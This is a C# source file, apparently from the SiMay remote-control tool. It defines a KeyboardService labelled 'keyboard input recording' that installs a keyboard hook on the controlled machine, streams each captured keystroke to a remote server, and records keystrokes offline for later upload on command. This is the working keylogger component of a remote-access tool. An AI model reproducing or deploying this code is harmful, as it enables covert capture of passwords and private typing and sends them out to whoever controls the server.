using SiMay.Core;
using SiMay.Core.PacketModelBinder.Attributes;
using SiMay.Core.PacketModelBinding;
using SiMay.Core.Packets;
using SiMay.ServiceCore.Attributes;
using SiMay.ServiceCore.Extensions;
using SiMay.Sockets.Tcp;
using SiMay.Sockets.Tcp.Session;
using System;

namespace SiMay.ServiceCore.ApplicationService
{
    [ServiceName("键盘输入记录")]
    [ServiceKey("RemoteKeyboradJob")]
    public class KeyboardService : ServiceManagerBase
    {
        private Keyboard _keyboard;
        public override void SessionClosed()
        {
            if (_keyboard != null)
            {
                _keyboard.NotiyProc -= _keyboard_NotiyProc;
                _keyboard.CloseHook();
                _keyboard = null;
            }
        }

        [PacketHandler(MessageHead.S_KEYBOARD_OFFLINE)]
        public void ActionOffLineRecords(TcpSocketSaeaSession session)
            => _keyboard.StartOfflineRecords();

        [PacketHandler(MessageHead.S_KEYBOARD_GET_OFFLINEFILE)]
        public void SendOffLineRecord(TcpSocketSaeaSession session)
        {
            SendAsyncToServer(MessageHead.C_KEYBOARD_OFFLINEFILE,
                _keyboard.GetOfflineRecord());
        }

        [PacketHandler(MessageHead.S_KEYBOARD_ONOPEN)]
        public void Init(TcpSocketSaeaSession session)
        {
            _keyboard = Keyboard.GetKeyboardInstance();
            _keyboard.NotiyProc += new Keyboard.KeyboardNotiyHandler(_keyboard_NotiyProc);
            _keyboard.Initialization();
        }

        private void _keyboard_NotiyProc(Keyboard.KeyboardHookEvent kevent, string key)
        {
            switch (kevent)
            {
                case Keyboard.KeyboardHookEvent.OpenSuccess:
                    break;

                case Keyboard.KeyboardHookEvent.OpenFail:
                    CloseSession();
                    break;

                case Keyboard.KeyboardHookEvent.Data:
                    SendAsyncToServer(MessageHead.C_KEYBOARD_DATA, key);
                    break;
            }
        }
    }
}